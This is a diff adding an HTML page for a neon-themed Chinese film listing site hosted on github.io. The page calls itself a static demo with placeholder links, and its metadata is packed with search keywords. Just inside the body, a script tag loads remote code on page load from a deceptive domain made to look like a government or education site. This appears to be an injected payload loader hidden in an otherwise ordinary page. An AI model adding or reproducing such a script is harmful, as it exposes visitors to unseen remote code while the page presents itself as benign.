@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>午夜影视 - 凌晨放映室·霓虹Noir片单 | wuyefuliyingshi-h5.github.io</title>
+<meta name="description" content="午夜影视（wuyefuliyingshi-h5.github.io）悬疑、惊悚、港风、赛博、文艺暗片、午夜短剧一库点亮：午夜靛蓝配霓虹品红与电光青，给睡不着的人。移动端自适应，免费高清演示站，纯静态单页。" />
+<meta name="keywords" content="午夜影视,wuyefuliyingshi-h5,午夜场,霓虹影视,悬疑电影,港风,赛博朋克,惊悚剧,失眠片单" />
+<link rel="canonical" href="https://wuyefuliyingshi-h5.github.io/" />
+<style>
+:root{
+  --mid:#0B1026;--mid2:#11163A;--magenta:#FF2E88;--cyan:#22D3EE;--violet:#6D28D9;
+  --amber:#FFB454;--ink:#E7ECFF;--gray:#9AA3C7;--line:rgba(34,211,238,.28);--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 80% at 12% -10%,rgba(109,40,217,.35),transparent 55%),
+    radial-gradient(120% 90% at 92% 0%,rgba(255,46,136,.28),transparent 52%),
+    radial-gradient(80% 60% at 50% 120%,rgba(34,211,238,.18),transparent 60%),
+    linear-gradient(180deg,#080B1E 0%,#0B1026 45%,#0E1330 100%);
+  color:var(--ink);line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+.rain{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+  background-image:repeating-linear-gradient(105deg,rgba(255,255,255,.05) 0 1px,transparent 1px 7px);
+  mix-blend-mode:screen;animation:rain 1.1s linear infinite}
+@keyframes rain{from{background-position:0 0}to{background-position:-40px 120px}}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(8,11,30,.82);backdrop-filter:blur(14px);border-bottom:1px solid rgba(34,211,238,.3)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.logo-mark{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--violet),var(--magenta));
+  display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 18px rgba(255,46,136,.5)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:600;letter-spacing:.5px}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:700;color:var(--gray)}
+.menu a:hover{background:rgba(34,211,238,.12);color:var(--cyan);text-shadow:0 0 8px rgba(34,211,238,.6)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:120px;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:#0A0E24;outline:none;font-size:13px;color:var(--ink)}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--magenta);color:#fff;font-size:13px;box-shadow:0 0 14px rgba(255,46,136,.5)}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#0A0E24;border-radius:8px;padding:6px 10px;font-size:16px;color:var(--cyan)}
+
+.hero{position:relative;z-index:1;margin:22px 0 6px;border-radius:26px;overflow:hidden;border:1px solid rgba(34,211,238,.4);
+  padding:48px 32px;text-align:center;background:linear-gradient(120deg,rgba(17,22,58,.92),rgba(109,40,217,.55))}
+.hero::after{content:"";position:absolute;left:0;right:0;bottom:0;height:40%;background:linear-gradient(180deg,transparent,rgba(34,211,238,.12))}
+.hero .badge{display:inline-block;font-size:12px;font-weight:800;color:#04121a;background:var(--cyan);padding:5px 14px;border-radius:999px;margin-bottom:12px;box-shadow:0 0 16px rgba(34,211,238,.6)}
+.hero h1{font-size:32px;margin:0 0 6px;text-shadow:0 0 24px rgba(255,46,136,.45)}
+.hero h1 em{font-style:normal;color:var(--magenta)}
+.hero p{color:#C7CEF2;font-size:14px;margin:0 0 18px}
+.bigbar{display:flex;gap:8px;max-width:660px;margin:0 auto;background:#0A0E24;border:1px solid var(--magenta);border-radius:999px;padding:6px 6px 6px 18px;box-shadow:0 0 22px rgba(255,46,136,.3)}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:var(--ink)}
+.bigbar button{border:0;padding:10px 24px;border-radius:999px;background:linear-gradient(135deg,var(--magenta),var(--violet));color:#fff;font-weight:900;cursor:pointer;box-shadow:0 0 18px rgba(109,40,217,.6)}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.35);color:var(--cyan)}
+.chips a:hover{background:var(--magenta);color:#fff;border-color:var(--magenta)}
+
+.signs{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;position:relative;z-index:1}
+.sign{background:#0C1130;border:1px solid rgba(34,211,238,.25);border-radius:14px;padding:16px 10px;text-align:center;position:relative;overflow:hidden}
+.sign::before{content:"";position:absolute;inset:0;background:radial-gradient(60% 60% at 50% 0%,rgba(255,46,136,.18),transparent 70%);opacity:.8}
+.sign .ic{font-size:22px;position:relative}
+.sign h3{font-size:13px;margin:6px 0 0;position:relative}
+.sign:nth-child(1){box-shadow:inset 0 0 0 1px rgba(255,46,136,.4)}
+.sign:nth-child(2){box-shadow:inset 0 0 0 1px rgba(34,211,238,.4)}
+.sign:nth-child(3){box-shadow:inset 0 0 0 1px rgba(109,40,217,.5)}
+.sign:nth-child(4){box-shadow:inset 0 0 0 1px rgba(255,180,84,.4)}
+.sign:nth-child(5){box-shadow:inset 0 0 0 1px rgba(34,211,238,.3)}
+.sign:nth-child(6){box-shadow:inset 0 0 0 1px rgba(255,46,136,.3)}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--magenta);padding-left:12px}
+.sec-head h2{font-size:21px;margin:0}
+.sec-head h2::before{content:"🌃 ";}
+.sec-head h2 .b{color:var(--magenta)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--cyan);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:#0C1130;border:1px solid rgba(34,211,238,.22);border-radius:16px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--magenta);box-shadow:0 16px 40px rgba(255,46,136,.25)}
+.cover{aspect-ratio:3/4;border-radius:16px 16px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#2a0a1f,#FF2E88)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#04222b,#22D3EE)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#1a0b3a,#6D28D9)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#2a1c08,#FFB454)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#0a0a1f,#3C7DFF)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#2a0010,#E2563B)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#04140f,#10B981)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#1a1030,#9B8BFF)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--magenta);color:#fff}
+.flag.noir{background:#11163A;color:var(--cyan);border:1px solid var(--cyan)}
+.flag.cyber{background:var(--violet);color:#fff}
+.flag.hk{background:var(--amber);color:#2a1c08}
+.flag.score{background:#0A0E24;color:var(--cyan);border:1px solid var(--cyan)}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 10px rgba(0,0,0,.6);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:rgba(34,211,238,.1);color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:#0C1130;border:1px solid rgba(34,211,238,.22);border-radius:14px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:#0C1130;border:1px solid rgba(255,46,136,.3);border-radius:16px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--magenta);text-shadow:0 0 12px rgba(255,46,136,.5)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed rgba(34,211,238,.2)}
+.rk:last-child{border-bottom:0}
+.rk b{width:24px;color:var(--cyan);font-size:15px;font-weight:900}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:12px;font-weight:800;color:var(--amber)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:#0C1130;border:1px solid rgba(34,211,238,.22);border-radius:18px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px}
+.ac h3::before{content:"🌙 ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#0A0E24;border:1px solid rgba(34,211,238,.25);border-radius:14px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--magenta)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid rgba(34,211,238,.2);background:#080B1E;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--cyan)}
+code{background:#0A0E24;border:1px solid rgba(34,211,238,.25);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid,.signs{grid-template-columns:repeat(3,1fr)}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#080B1E;border-bottom:1px solid rgba(34,211,238,.3);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:23px}
+  .grid,.signs,.zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="rain"></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="logo-mark">🌃</div>
+      <div>午夜影视<small>wuyefuliyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">凌晨首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">短纪</a>
+      <a href="#about">关于午夜</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="重庆森林 / 银翼杀手 / 默杀 / 诡秘之主" />
+      <button onclick="alert('演示站：搜索用 # 占位')">开灯搜</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">🌃 凌晨 0 点放映室 · 给睡不着的人</span>
+    <h1>午夜影视，<br/><em>城市熄灯，片单亮起来</em></h1>
+    <p>悬疑、惊悚、港风、赛博、文艺暗片、午夜短剧——湿街反光、霓虹斜照、一个人也看得起劲。不喊“全家一起看”，只陪你熬过凌晨。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="重庆森林 / 银翼杀手2049 / 默杀 / 看不见的客人 / 赛博朋克：边缘行者" />
+      <button onclick="alert('演示站：结果用 # 占位')">放映</button>
+    </div>
+    <div class="chips">
+      <a href="#movie">午夜场电影</a>
+      <a href="#noir">港风·Noir</a>
+      <a href="#cyber">赛博·惊悚</a>
+      <a href="#tv">暗调剧集</a>
+      <a href="#short">失眠短剧</a>
+      <a href="#rank">失眠片单榜</a>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-head"><h2><span class="b">霓虹</span>招牌频道</h2><span>Late Night Signs</span></div>
+    <div class="signs">
+      <div class="sign"><div class="ic">🕵️</div><h3>悬疑暗房</h3></div>
+      <div class="sign"><div class="ic">🌆</div><h3>港风霓虹</h3></div>
+      <div class="sign"><div class="ic">🤖</div><h3>赛博夜城</h3></div>
+      <div class="sign"><div class="ic">🔪</div><h3>惊悚午夜</h3></div>
+      <div class="sign"><div class="ic">🎷</div><h3>文艺蓝调</h3></div>
+      <div class="sign"><div class="ic">🛋️</div><h3>失眠短剧</h3></div>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">午夜场</span>电影</h2><span>Midnight Films</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hk">港风</span><h4>重庆森林</h4></div><div class="body"><div class="tags"><span>王家卫</span><span>霓虹</span><span>9.4</span></div><p>罐头、雨夜、过期的爱，凌晨最对味。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag cyber">赛博</span><h4>银翼杀手2049</h4></div><div class="body"><div class="tags"><span>科幻</span><span>雨夜</span><span>9.3</span></div><p>全息少女、橙紫天、一个人找自己。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag noir">Noir</span><h4>看不见的客人</h4></div><div class="body"><div class="tags"><span>悬疑</span><span>反转</span><span>9.2</span></div><p>钟摆一样的时间线，越晚越上头。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">惊悚</span><h4>默杀</h4></div><div class="body"><div class="tags"><span>悬疑</span><span>暗黑</span><span>新片</span></div><p>沉默、涂鸦、雨里的真相很重。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hk">港风</span><h4>花样年华</h4></div><div class="body"><div class="tags"><span>王家卫</span><span>旗袍</span><span>9.5</span></div><p>走廊、烟、没说出口的话最疼。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag noir">文艺</span><h4>蓝莓之夜</h4></div><div class="body"><div class="tags"><span>公路</span><span>蓝调</span><span>深夜</span></div><p>便利店、派、美国夜路，慢慢漂。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag cyber">赛博</span><h4>攻壳机动队</h4></div><div class="body"><div class="tags"><span>动画</span><span>义体</span><span>9.0</span></div><p>雨、招牌、灵魂在哪台服务器。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag score">9.1</span><h4>爱乐之城</h4></div><div class="body"><div class="tags"><span>夜景</span><span>爵士</span><span>遗憾</span></div><p>山巅那场蓝紫梦，凌晨看会酸。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head" id="tv"><h2><span class="b">暗调</span>剧集</h2><span>Dark Series</span><a class="more" href="#">更多 #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">📺</div><h3>风骚律师</h3><p>律师变坏，夜色里全是算计。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>真探 第一季</h3><p>黄衣之王、路易斯安那的湿和热。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>繁城之下</h3><p>明末县衙、雨、刀、人情鬼蜮。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>暗黑 第三季</h3><p>时间虫洞，越晚越绕越爽。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>沉默的真相</h3><p>地铁、书包、一条命换真相。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>亢奋</h3><p>霓虹、药、青少年的夜不肯睡。</p></div>
+        </div>
+
+        <div class="sec-head" id="acg" style="margin-top:26px"><h2><span class="b">赛博</span> / 暗综艺</h2><span>Cyber & Dark Variety</span><a class="more" href="#">更多 #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag cyber">赛博</span><h4>赛博朋克：边缘行者</h4></div><div class="body"><div class="tags"><span>动画</span><span>夜城</span><span>9.2</span></div><p>夜之城、义体、活不过片尾的浪漫。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag noir">暗综</span><h4>大侦探·夜场</h4></div><div class="body"><div class="tags"><span>推理</span><span>剧本</span><span>长更</span></div><p>别墅、断电、弹幕比人清醒。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag hk">港风</span><h4>金宵大厦</h4></div><div class="body"><div class="tags"><span>奇幻</span><span>粤语</span><span>9.0</span></div><p>老厦、梦、前世今生的霓虹。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">声音</span><h4>凌晨电台·悬疑夜</h4></div><div class="body"><div class="tags"><span>播客</span><span>都市怪谈</span><span>解压</span></div><p>关灯听，楼道声会变大。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>🌙 失眠片单榜</h3>
+        <div class="rk"><b>1</b><div><h4>重庆森林</h4><span>电影 / 港风</span></div><em>9.4</em></div>
+        <div class="rk"><b>2</b><div><h4>银翼杀手2049</h4><span>电影 / 赛博</span></div><em>9.3</em></div>
+        <div class="rk"><b>3</b><div><h4>看不见的客人</h4><span>电影 / 悬疑</span></div><em>9.2</em></div>
+        <div class="rk"><b>4</b><div><h4>风骚律师</h4><span>剧集 / Noir</span></div><em>9.5</em></div>
+        <div class="rk"><b>5</b><div><h4>花样年华</h4><span>电影 / 港风</span></div><em>9.5</em></div>
+        <div class="rk"><b>6</b><div><h4>赛博朋克：边缘行者</h4><span>动漫 / 夜城</span></div><em>9.2</em></div>
+        <div class="rk"><b>7</b><div><h4>真探 第一季</h4><span>剧集 / 暗调</span></div><em>9.1</em></div>
+        <div class="rk"><b>8</b><div><h4>沉默的真相</h4><span>剧集 / 悬疑</span></div><em>9.4</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="short">
+    <div class="sec-head"><h2><span class="b">失眠</span>短剧 / 午夜纪录</h2><span>Insomnia Shorts</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag noir">微短剧</span><h4>23:59 便利店</h4></div><div class="body"><div class="tags"><span>3集</span><span>夜班</span><span>怪客</span></div><p>凌晨关东煮、穿雨衣不说话的客人。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag cyber">纪录</span><h4>霓虹城市夜</h4></div><div class="body"><div class="tags"><span>城市</span><span>延时</span><span>湿街</span></div><p>招牌倒影、的士尾灯、城市不睡。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hk">微短剧</span><h4>铜锣湾来电</h4></div><div class="body"><div class="tags"><span>港风</span><span>悬疑</span><span>5集</span></div><p>公用电话、旧磁带、一个没还的人情。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">声音纪</span><h4>雨声白噪音</h4></div><div class="body"><div class="tags"><span>ASMR</span><span>失眠</span><span>循环</span></div><p>天窗漏雨、远处霓虹嗡嗡响。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 午夜影视</h2><span>About</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>午夜影视是什么？</h3>
+        <p>午夜影视（wuyefuliyingshi-h5.github.io）不是全家客厅，也不是秋日茶桌，而是“凌晨放映室”：悬疑、惊悚、港风、赛博、文艺暗片、午夜短剧都在霓虹底下亮着。它比高清更街、比奇米更冷、比秋秋更夜、比久久久更暗——关键词是：凌晨、湿街、孤独、反转、港风、赛博、睡不着。</p>
+        <div class="stats">
+          <div class="st"><b>🌃</b><span>凌晨放映室</span></div>
+          <div class="st"><b>6块</b><span>霓虹招牌</span></div>
+          <div class="st"><b>6</b><span>栏目</span></div>
+          <div class="st"><b>100%</b><span>移动端适配</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源，与任何“午夜影视” App 无隶属</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>午夜靛蓝 + 品红 + 电光青 = 霓虹 Noir 影视站</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    午夜影视 · <a href="https://wuyefuliyingshi-h5.github.io/">wuyefuliyingshi-h5.github.io</a><br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 午夜影视 Demo · 城市熄灯，片单亮起来 🌃
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
